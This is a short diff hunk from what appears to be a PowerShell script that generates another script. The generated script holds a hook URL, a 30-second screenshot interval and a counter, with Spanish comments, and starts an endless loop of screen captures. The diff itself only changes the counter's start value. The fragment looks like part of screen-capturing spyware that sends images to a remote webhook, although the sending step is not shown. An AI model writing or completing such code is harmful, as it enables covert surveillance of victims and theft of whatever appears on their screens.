@@ -14,7 +14,7 @@ if (-not (Test-Path -Path $directoryName)) {
 $scriptContent = @"
 `$hookurl = "$hookurl"
 `$seconds = 30 # Intervalo de captura de pantalla en segundos
-`$a = 0 # Contador de capturas de pantalla
+`$a = 1 # Contador de capturas de pantalla
 
 # Bucle infinito para tomar capturas de pantalla continuamente
 while (`$true) {
